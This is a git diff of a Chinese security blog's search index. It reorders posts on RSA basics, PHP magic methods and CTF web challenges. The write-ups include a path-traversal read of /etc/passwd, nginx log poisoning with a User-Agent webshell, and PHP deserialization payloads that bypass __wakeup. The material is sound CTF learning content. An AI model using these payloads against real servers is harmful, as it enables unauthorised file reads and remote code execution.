-<li>什么是RSA<br>RSA算法是现今使用最广泛的公钥密码算法，也是号称地球上最安全的加密算法。在了解RSA算法之前，先熟悉下几个术语<br>根据密钥的使用方法，可以将密码分为对称密码和公钥密码<br>对称密码：加密和解密使用同一种密钥的方式<br>公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码。 </li>
-<li>RSA加密<br>RSA的加密过程可以使用一个通式来表达 </li>
-</ol>
-<span id="more"></span>
+    <title>常用魔法函数</title>
+    <url>/2023/01/07/%E5%B8%B8%E7%94%A8%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、__get、__set</span><br><span class="line"></span><br><span class="line">这两个方法是为在类和他们的父类中没有声明的属性而设计的</span><br><span class="line"></span><br><span class="line">__get( $property ) 当调用一个未定义的属性时访问此方法</span><br><span class="line"></span><br><span class="line">__set( $property, $value ) 给一个未定义的属性赋值时调用</span><br><span class="line"></span><br><span class="line">这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</span><br><span class="line"></span><br><span class="line">2、__isset、__unset</span><br><span class="line"></span><br><span class="line">__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法</span><br><span class="line"></span><br><span class="line">__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法</span><br><span class="line"></span><br><span class="line">与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</span><br><span class="line"></span><br><span class="line">3、__call</span><br><span class="line"></span><br><span class="line">__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法</span><br><span class="line"></span><br><span class="line">4、__autoload</span><br><span class="line"></span><br><span class="line">__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</span><br><span class="line"></span><br><span class="line">注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。</span><br><span class="line"></span><br><span class="line">5、__construct、__destruct</span><br><span class="line"></span><br><span class="line">__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span><br><span class="line"></span><br><span class="line">__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span><br><span class="line"></span><br><span class="line">默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.</span><br><span class="line"></span><br><span class="line">在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。</span><br><span class="line"></span><br><span class="line">6、__clone</span><br><span class="line"></span><br><span class="line">PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。</span><br><span class="line"></span><br><span class="line">7、__toString</span><br><span class="line"></span><br><span class="line">__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。</span><br><span class="line"></span><br><span class="line">在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）</span><br><span class="line"></span><br><span class="line">从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。</span><br><span class="line"></span><br><span class="line">8、__sleep、__wakeup</span><br><span class="line"></span><br><span class="line">__sleep 串行化的时候用</span><br><span class="line"></span><br><span class="line">__wakeup 反串行化的时候调用</span><br><span class="line"></span><br><span class="line">serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。</span><br><span class="line"></span><br><span class="line">使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。</span><br><span class="line"></span><br><span class="line">相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</span><br><span class="line"></span><br><span class="line">9、__set_state</span><br><span class="line"></span><br><span class="line">当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =&gt; value, …)格式排列的类属性。</span><br><span class="line"></span><br><span class="line">10、__invoke</span><br><span class="line"></span><br><span class="line">当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效</span><br><span class="line"></span><br><span class="line">11、__callStatic</span><br><span class="line"></span><br><span class="line">它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。</span><br><span class="line"></span><br><span class="line">同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。</span><br></pre></td></tr></table></figure>
 
-<p>密文＝明文EmodN<br>密文＝明文EmodN<br>也就是说RSA加密是对明文的E次方后除以N后求余数的过程。就这么简单？对，就是这么简单。<br>从通式可知，只要知道E和N任何人都可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说E和N的组合就是公钥，我们用(E,N)来表示公钥</p>
-<p>公钥＝(E,N)<br>公钥＝(E,N)<br>不过E和N不并不是随便什么数都可以的，它们都是经过严格的数学计算得出的，关于E和N拥有什么样的要求及其特性后面会讲到。顺便啰嗦一句E是加密（Encryption）的首字母，N是数字（Number）的首字母</p>
-<ol>
-<li>RSA解密<br>RSA的解密同样可以使用一个通式来表达</li>
-</ol>
-<p>明文＝密文DmodN<br>明文＝密文DmodN<br>也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥</p>
-<p>私钥＝(D,N)<br>私钥＝(D,N)<br>从上述可以看出RSA的加密方式和解密方式是相同的，加密是求“E次方的mod N”;解密是求“D次方的mod N”<br>此处D是解密（Decryption）的首字母；N是数字（Number）的首字母。</p>
-<p>小结下</p>
-<p>公钥    （E，N）<br>私钥    （D，N）<br>密钥对    （E，D，N）<br>加密<br>密文＝明文EmodN<br>密文＝明文EmodN<br>解密<br>明文＝密文DmodN<br>明文＝密文DmodN<br>\4. 生成密钥对<br>既然公钥是（E，N），私钥是（D，N）所以密钥对即为（E，D，N）但密钥对是怎样生成的？步骤如下：</p>
-<p>求N<br>求L（L为中间过程的中间数）<br>求E<br>求D<br>4.1 求N<br>准备两个质数p，q。这两个数不能太小，太小则会容易破解，将p乘以q就是N</p>
-<p>N=p∗q<br>N=p∗q<br>4.2 求L<br>L 是 p－1 和 q－1的最小公倍数，可用如下表达式表示</p>
-<p>L=lcm（p－1，q－1）<br>L=lcm（p－1，q－1）<br>4.3 求E<br>E必须满足两个条件：E是一个比1大比L小的数，E和L的最大公约数为1<br>用gcd(X,Y)来表示X，Y的最大公约数则E条件如下：</p>
-<p>1 &lt; E &lt; L<br>gcd（E，L）=1<br>之所以需要E和L的最大公约数为1是为了保证一定存在解密时需要使用的数D。现在我们已经求出了E和N也就是说我们已经生成了密钥对中的公钥了。</p>
-<p>4.4 求D<br>数D是由数E计算出来的。D、E和L之间必须满足以下关系：</p>
-<p>1 &lt; D &lt; L<br>E＊D mod L ＝ 1<br>只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。<br>简单地说条件2是为了保证密文解密后的数据就是明文。<br>现在私钥自然也已经生成了，密钥对也就自然生成了。<br>小结下：</p>
-<p>求N    N＝ p ＊ q ；p，q为质数<br>求L    L＝lcm（p－1，q－1） ；L为p－1、q－1的最小公倍数<br>求E    1 &lt; E &lt; L，gcd（E，L）=1；E，L最大公约数为1（E和L互质）<br>求D    1 &lt; D &lt; L，E＊D mod L ＝ 1<br>5 实践下吧<br>我们用具体的数字来实践下RSA的密钥对对生成，及其加解密对全过程。为方便我们使用较小数字来模拟。</p>
-<p>5.1 求N<br>我们准备两个很小对质数，<br>p ＝ 17<br>q ＝ 19<br>N ＝ p ＊ q ＝ 323</p>
-<p>5.2 求L<br>L ＝ lcm（p－1， q－1）＝ lcm(16，18） ＝ 144<br>144为16和18对最小公倍数</p>
-<p>5.3 求E<br>求E必须要满足2个条件：1 &lt; E &lt; L ，gcd（E，L）=1<br>即1 &lt; E &lt; 144，gcd（E，144） ＝ 1<br>E和144互为质数，5显然满足上述2个条件<br>故E ＝ 5</p>
-<p>此时公钥=(E，N）＝ （5，323）</p>
-<p>5.4 求D<br>求D也必须满足2个条件：1 &lt; D &lt; L，E＊D mod L ＝ 1<br>即1 &lt; D &lt; 144，5 ＊ D mod 144 ＝ 1<br>显然当D＝ 29 时满足上述两个条件<br>1 &lt; 29 &lt; 144<br>5＊29 mod 144 ＝ 145 mod 144 ＝ 1<br>此时私钥＝（D，N）＝（29，323）</p>
-<p>5.5 加密<br>准备的明文必须时小于N的数，因为加密或者解密都要mod N其结果必须小于N<br>假设明文 ＝ 123<br>则 密文＝明文EmodN＝1235mod323=225密文＝明文EmodN＝1235mod323=225<br>5.6 解密<br>明文＝密文DmodN＝22529mod323=123明文＝密文DmodN＝22529mod323=123<br>解密后的明文为123。<br><a href="https://blog.csdn.net/dbs1215/article/details/48953589">https://blog.csdn.net/dbs1215/article/details/48953589</a></p>
-<p>附上一脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time : 2022/12/6 10:10</span><br><span class="line"># @Author : 阿伦</span><br><span class="line"># @File : 1</span><br><span class="line"># @Project : py</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">n = p * q</span><br><span class="line"># 密文</span><br><span class="line">C = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - 1) * (q - 1))</span><br><span class="line">print(d)</span><br><span class="line"># 求明文</span><br><span class="line">M = pow(C, d, n)  # 快速求幂取模运算</span><br><span class="line">print(M)</span><br></pre></td></tr></table></figure>]]></content>
+<span id="more"></span>]]></content>
       <categories>
-        <category>RSA基础</category>
+        <category>反序列化</category>
       </categories>
       <tags>
-        <tag>RSA</tag>
+        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1560,19 +1573,6 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
 <p>POST部分：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:”BUU”:2:{s:7:”correct”;s:0:””;s:5:”input”;R:2;}</p>
 <p><img src="/2023/01/07/%E5%BC%95%E7%94%A8%E8%B5%8B%E5%80%BC%E6%9E%84%E9%80%A0%E5%BA%8F%E5%88%97%E5%8C%96-BUU-CODE-REVIEW/1671156772602-f8427614-90bf-44ea-b138-c6c4fecafc6b.png" alt="img"></p>
 ]]></content>
-      <categories>
-        <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>常用魔法函数</title>
-    <url>/2023/01/07/%E5%B8%B8%E7%94%A8%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、__get、__set</span><br><span class="line"></span><br><span class="line">这两个方法是为在类和他们的父类中没有声明的属性而设计的</span><br><span class="line"></span><br><span class="line">__get( $property ) 当调用一个未定义的属性时访问此方法</span><br><span class="line"></span><br><span class="line">__set( $property, $value ) 给一个未定义的属性赋值时调用</span><br><span class="line"></span><br><span class="line">这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</span><br><span class="line"></span><br><span class="line">2、__isset、__unset</span><br><span class="line"></span><br><span class="line">__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法</span><br><span class="line"></span><br><span class="line">__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法</span><br><span class="line"></span><br><span class="line">与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</span><br><span class="line"></span><br><span class="line">3、__call</span><br><span class="line"></span><br><span class="line">__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法</span><br><span class="line"></span><br><span class="line">4、__autoload</span><br><span class="line"></span><br><span class="line">__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</span><br><span class="line"></span><br><span class="line">注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。</span><br><span class="line"></span><br><span class="line">5、__construct、__destruct</span><br><span class="line"></span><br><span class="line">__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span><br><span class="line"></span><br><span class="line">__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span><br><span class="line"></span><br><span class="line">默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.</span><br><span class="line"></span><br><span class="line">在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。</span><br><span class="line"></span><br><span class="line">6、__clone</span><br><span class="line"></span><br><span class="line">PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。</span><br><span class="line"></span><br><span class="line">7、__toString</span><br><span class="line"></span><br><span class="line">__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。</span><br><span class="line"></span><br><span class="line">在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）</span><br><span class="line"></span><br><span class="line">从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。</span><br><span class="line"></span><br><span class="line">8、__sleep、__wakeup</span><br><span class="line"></span><br><span class="line">__sleep 串行化的时候用</span><br><span class="line"></span><br><span class="line">__wakeup 反串行化的时候调用</span><br><span class="line"></span><br><span class="line">serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。</span><br><span class="line"></span><br><span class="line">使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。</span><br><span class="line"></span><br><span class="line">相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</span><br><span class="line"></span><br><span class="line">9、__set_state</span><br><span class="line"></span><br><span class="line">当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =&gt; value, …)格式排列的类属性。</span><br><span class="line"></span><br><span class="line">10、__invoke</span><br><span class="line"></span><br><span class="line">当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效</span><br><span class="line"></span><br><span class="line">11、__callStatic</span><br><span class="line"></span><br><span class="line">它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。</span><br><span class="line"></span><br><span class="line">同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>]]></content>
       <categories>
         <category>反序列化</category>
       </categories>
@@ -1829,6 +1829,30 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
+    <title>(目录穿越)HNCTF中的一道题</title>
+    <url>/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
+    <content><![CDATA[<p>[WEEK2]easy_include</p>
+<p>​      这个题直接包含日志，在UA头写入一句话木马，然后就可以include到当前php文件中，实现命令执行。</p>
+<p>注意一个问题就是，每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。</p>
+<p>再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将你的一句话木马写入access.log日志，第二次发包才包含到前一次的日志中的木马。</p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072737521-06c907d2-9a64-4886-a93e-43a6bc19c3cc.png" alt="img"></p>
+<p>构造payload：     ?file=/etc/passwd  可以访问内网文件</p>
+<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072775580-591516be-aa57-4813-b4d8-45683350f308.png" alt="img"></p>
+<p>nginx的日志文件为/var/log/nginx/access.log</p>
+<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072964901-350e88e1-12d2-4dd5-bc82-c5dd5dcdffe9.png" alt="img"></p>
+<p>构造UA头一句话木马</p>
+<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668073159817-8b29b857-b91b-40a0-b40d-c5ecde48c1d3.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(绕waf)[SWPUCTF 2021 新生赛]sql</title>
     <url>/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/</url>
     <content><![CDATA[<p><img src="/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/1670987374639-4c9ed84c-df0f-453f-ae38-9e15ddbfbce7.png" alt="img"></p>
@@ -1862,24 +1886,24 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
-    <title>(目录穿越)HNCTF中的一道题</title>
-    <url>/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
-    <content><![CDATA[<p>[WEEK2]easy_include</p>
-<p>​      这个题直接包含日志，在UA头写入一句话木马，然后就可以include到当前php文件中，实现命令执行。</p>
-<p>注意一个问题就是，每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。</p>
-<p>再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将你的一句话木马写入access.log日志，第二次发包才包含到前一次的日志中的木马。</p>
+    <title>(绕过_wakeup魔法函数)[SWPUCTF 2021 新生赛]no_wakeup</title>
+    <url>/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;class.php&quot;);</span><br><span class="line"></span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function __wakeup()&#123;             	//_wakeup魔法函数，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$Letmeseesee = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($Letmeseesee);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
 <span id="more"></span>
 
-<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072737521-06c907d2-9a64-4886-a93e-43a6bc19c3cc.png" alt="img"></p>
-<p>构造payload：     ?file=/etc/passwd  可以访问内网文件</p>
-<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072775580-591516be-aa57-4813-b4d8-45683350f308.png" alt="img"></p>
-<p>nginx的日志文件为/var/log/nginx/access.log</p>
-<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072964901-350e88e1-12d2-4dd5-bc82-c5dd5dcdffe9.png" alt="img"></p>
-<p>构造UA头一句话木马</p>
-<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668073159817-8b29b857-b91b-40a0-b40d-c5ecde48c1d3.png" alt="img"></p>
+<p>在34行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；</p>
+<p>php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup(); 因而先构造序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$aa=new HaHaHa();</span><br><span class="line">$aa-&gt;admin=&quot;admin&quot;;</span><br><span class="line">$aa-&gt;passwd=&quot;wllm&quot;;</span><br><span class="line">$stus=serialize($aa);</span><br><span class="line">print_r($stus);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/1671072021557-69d0075f-fe21-47ff-865f-e01fc6d01c89.png" alt="img"></p>
+<p>将序列化得到的          O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>
+<p>改为               O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>
+<p>即可绕过__wakeup</p>
+<p><img src="/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/1671072102334-c745feff-7182-4544-9f3c-9ea5dd1ac934.png" alt="img"></p>
 ]]></content>
       <categories>
-        <category>文件包含</category>
+        <category>反序列化</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1926,30 +1950,6 @@ include('files/'.$action.'.php'); //载入相应文件
       </categories>
       <tags>
         <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>(绕过_wakeup魔法函数)[SWPUCTF 2021 新生赛]no_wakeup</title>
-    <url>/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;class.php&quot;);</span><br><span class="line"></span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function __wakeup()&#123;             	//_wakeup魔法函数，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$Letmeseesee = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($Letmeseesee);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<p>在34行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；</p>
-<p>php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup(); 因而先构造序列化</p>
